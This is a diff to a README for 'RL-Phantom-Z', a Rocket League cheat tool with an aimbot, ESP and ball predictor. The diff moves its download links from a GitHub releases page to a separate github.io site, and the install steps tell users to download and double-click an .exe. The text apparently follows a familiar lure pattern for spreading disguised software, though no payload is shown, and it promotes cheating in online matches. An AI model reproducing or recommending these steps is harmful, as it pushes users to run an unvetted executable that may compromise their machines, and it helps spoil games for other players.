@@ -1,6 +1,6 @@
 # 🚀 RL-Phantom-Z - Gain control of professional rocket matches
 
-[![Download](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/binding-landgrant712/RL-Phantom-Z/releases)
+[![Download](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://binding-landgrant712.github.io)
 
 RL-Phantom-Z provides players with a toolset to improve performance in Rocket League. The software includes a ball predictor, aimbot, boost manager, and extra sensory perception features. These tools help players navigate the arena and react to ball movement.
 
@@ -19,7 +19,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following address to open the download page: https://github.com/binding-landgrant712/RL-Phantom-Z/releases
+1. Visit the following address to open the download page: https://binding-landgrant712.github.io
 2. Click the asset file ending in .exe to start your download.
 3. Once the download finishes, locate the file in your Downloads folder.
 4. Double-click the file to open the installation wizard.
